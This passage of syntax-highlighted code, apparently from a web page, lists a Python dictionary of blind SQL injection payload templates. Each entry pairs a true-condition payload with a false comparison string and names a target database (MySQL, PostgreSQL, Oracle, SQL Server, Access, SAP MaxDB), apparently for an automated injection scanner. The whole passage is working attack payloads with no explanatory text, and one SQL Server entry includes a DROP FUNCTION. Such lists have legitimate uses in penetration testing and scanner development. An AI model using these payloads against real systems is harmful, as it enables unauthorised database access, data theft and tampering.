'</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_36":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_37":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_12":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> ([RANDNUM]=[RANDNUM1])*[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> ([RANDNUM]=[RANDNUM])*[RANDNUM1]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_13":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': " AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': " AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_10":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_11":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> ([RANDNUM]=[RANDNUM1])*[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> ([RANDNUM]=[RANDNUM])*[RANDNUM1]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_16":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_17":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> (<span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM2]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> (<span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM2]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_14":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': " OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': " OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_15":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_18":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM],[ORIGVALUE])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_19":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_52":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_56":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_57":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ;IIF([RANDNUM]=[RANDNUM1],1,1/0)', 'dbms': 'Microsoft Access',</span><br><span class="line">         'payload': ' ;IIF([RANDNUM]=[RANDNUM],1,1/0)', 'level': '1'&#125;,</span><br><span class="line">    "INJPAY_54":</span><br><span class="line">        &#123;'comparsion': ' ;IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]',</span><br><span class="line">         'dbms': 'Microsoft SQL Server',</span><br><span class="line">         'payload': ' ;IF([RANDNUM]=[RANDNUM]) <span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> [RANDSTR]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_1":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_2":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_3":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">NOT</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">NOT</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_4":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_5":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_6":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">RLIKE</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">RLIKE</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_7":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_8":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">MAKE_SET</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_9":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_53":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_49":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM1] <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span>dbms<span class="string">': '</span>SAP MaxDB<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM] <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_48":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM1] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span>dbms<span class="string">': '</span>SAP MaxDB<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_45":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_44":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_47":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_46":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],<span class="number">1</span>,<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,<span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>,<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_41":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_40":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_43":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> 